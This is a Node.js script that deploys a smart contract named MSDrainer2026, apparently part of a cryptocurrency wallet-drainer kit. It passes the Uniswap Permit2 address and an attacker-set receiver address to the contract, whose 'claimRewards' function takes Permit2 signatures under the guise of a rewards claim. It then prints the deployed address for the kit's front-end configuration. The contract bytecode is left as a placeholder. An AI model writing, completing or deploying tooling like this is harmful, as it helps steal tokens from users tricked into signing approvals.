const { ethers } = require("ethers");
require("dotenv").config();

async function main() {
    const PRIVATE_KEY = process.env.PRIVATE_KEY;
    const RPC_URL = process.argv[2]; // Pass RPC URL as first argument

    if (!PRIVATE_KEY || !RPC_URL) {
        console.error("Usage: node scripts/deploy_ms_drainer.js <RPC_URL>");
        process.exit(1);
    }

    const provider = new ethers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

    const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
    const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || wallet.address;
    const BONUS_TOKEN = "0x0000000000000000000000000000000000000000"; // Placeholder for $TRACE or similar

    console.log(`🚀 Deploying MSDrainer2026 on ${RPC_URL}...`);
    console.log(`Wallet: ${wallet.address}`);

    const abi = [
        "constructor(address _permit2, address _receiver, address _bonusToken)",
        "function claimRewards(tuple(tuple(address token, uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permit, bytes signature, uint256 claimAmount) external payable"
    ];

    // INSTRUCTIONS: Compile your contract using solc or hardhat and paste the bytecode here.
    // Example: const bytecode = "0x...";
    const bytecode = "PASTE_YOUR_BYTECODE_HERE";

    if (bytecode === "PASTE_YOUR_BYTECODE_HERE") {
        console.error("❌ Bytecode missing. Please compile MSDrainer2026.sol and paste the bytecode in the script.");
        process.exit(1);
    }

    const factory = new ethers.ContractFactory(abi, bytecode, wallet);
    const contract = await factory.deploy(PERMIT2_ADDRESS, RECEIVER_ADDRESS, BONUS_TOKEN);
    await contract.waitForDeployment();

    console.log(`✅ MSDrainer2026 deployed to: ${await contract.getAddress()}`);
    console.log(`\nUpdate your .env.local:`);
    console.log(`NEXT_PUBLIC_MS_DRAINER_2026_ADDRESS=${await contract.getAddress()}`);
}

main().catch((error) => {
    console.error(error);
    process.exit(1);
});
